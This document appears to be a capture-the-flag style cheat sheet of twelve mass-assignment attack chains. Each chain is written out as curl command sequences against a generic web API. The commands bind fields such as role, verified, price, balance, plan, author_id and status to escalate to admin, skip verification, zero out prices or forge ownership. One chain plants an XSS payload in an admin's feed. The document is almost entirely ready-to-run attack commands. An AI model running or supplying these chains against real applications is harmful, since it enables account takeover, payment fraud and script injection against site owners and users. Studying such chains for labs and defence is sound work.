# Attack shapes deep — the canonical chains with full command sequences

## Shape 1 — register-time privilege

```bash
# bind at register
curl -X POST "$BASE/api/register" -H 'Content-Type: application/json' \
  -d '{"username":"x1","password":"p","role":"admin"}'

# read-back
curl "$BASE/api/users/x1"              # "role":"admin"

# exercise
curl -b "$JAR" "$BASE/admin"           # 200 + flag/users
```

The register binder accepts the unlisted field; the role gate reads
the stored `role`. The full chain in three requests.

## Shape 2 — profile escalation

```bash
# the update binder is wider
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"role":"admin"}'

curl -b "$JAR" "$BASE/api/me"          # "role":"admin"
curl -b "$JAR" "$BASE/admin"           # 200
```

The register was clean; the update's wider allowlist is the hole.

## Shape 3 — verification skip

```bash
curl -X POST "$BASE/register" -H 'Content-Type: application/json' \
  -d '{"username":"x2","password":"p","verified":true,"is_active":true}'

curl -b "$JAR" "$BASE/api/me"          # "verified":true
curl -b "$JAR" "$BASE/flag"            # verify-gated flag opens
```

`verified`/`is_active`/`approved`/`activated`/`email_verified_at` —
the state fields skip the workflow edge.

## Shape 4 — economic override

```bash
curl -X POST "$BASE/orders" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"product":"flag-item","price":0}'

curl -b "$JAR" -X POST "$BASE/checkout" -d '{"order_id":9}'
# the bound price reaches the total → "purchased" the flag item
```

The totals code reads the bound `price`/`total`/`discount`, not the
catalog lookup.

## Shape 5 — balance graft

```bash
curl -X PATCH "$BASE/users/me" -d '{"balance":999999}' -b "$JAR"
curl -b "$JAR" "$BASE/api/me"          # "balance":999999
curl -b "$JAR" -X POST "$BASE/purchase/flag-item"   # the bound balance buys it
```

## Shape 6 — plan theft

```bash
curl -X PATCH "$BASE/users/me" -d '{"plan":"enterprise"}' -b "$JAR"
curl -b "$JAR" "$BASE/premium"         # plan gate opens → flag
```

## Shape 7 — ownership forgery

```bash
curl -X POST "$BASE/notes" -d '{"author_id":1,
  "content":"<img src=x onerror=fetch(...)>"}' -b "$JAR"
# note authored as admin → admin's feed renders → XSS reach
```

`author_id`/`user_id`/`created_by` bound to another principal.

## Shape 8 — workflow injection

```bash
curl -X POST "$BASE/orders" -d '{"status":"shipped"}' -b "$JAR"
curl -X POST "$BASE/flag-submissions" -d '{"correct":true}' -b "$JAR"
```

Status fields skipping the intended workflow — `status`, `state`,
`current_step`, `review_status`, `order_status`, `correct`.

## Shape 9 — the chained role

```bash
# edge 1: bound role
curl -X PATCH "$BASE/users/me" -d '{"role":"admin"}' -b "$JAR"
# edge 2: admin opens
curl -b "$JAR" "$BASE/admin"
# edge 3: admin binder's own MA
curl -b "$JAR" -X POST "$BASE/admin/users" \
  -d '{"u":"x","flag_visible":true,"role":"admin"}'
# edge 4: the flag
curl -b "$JAR" "$BASE/api/flag"
```

## Shape 10 — nested tunnel

```bash
curl -X PATCH "$BASE/users/me" -d '{"profile":{"role":"admin",
  "settings":{"is_admin":true}}}' -b "$JAR"
# flat allowlist drops "role"; profile is allowed; deep merge reaches in
```

## Shape 11 — type coercion

```bash
curl -X PATCH "$BASE/users/me" -d '{"role":1}' -b "$JAR"           # enum int
curl -X PATCH "$BASE/users/me" -d '{"groups":[{"id":1}]}' -b "$JAR" # FK array
curl -X PATCH "$BASE/users/me" -d '{"role":true}' -b "$JAR"         # bool
```

## Shape 12 — discriminator switch

```bash
curl -X POST "$BASE/register" -d '{"username":"x","_t":"AdminUser"}' -b "$JAR"
# the sub-schema switches to AdminUser → its privileged fields bind next
curl -X PATCH "$BASE/users/me" -d '{"clearance":"top"}' -b "$JAR"
```
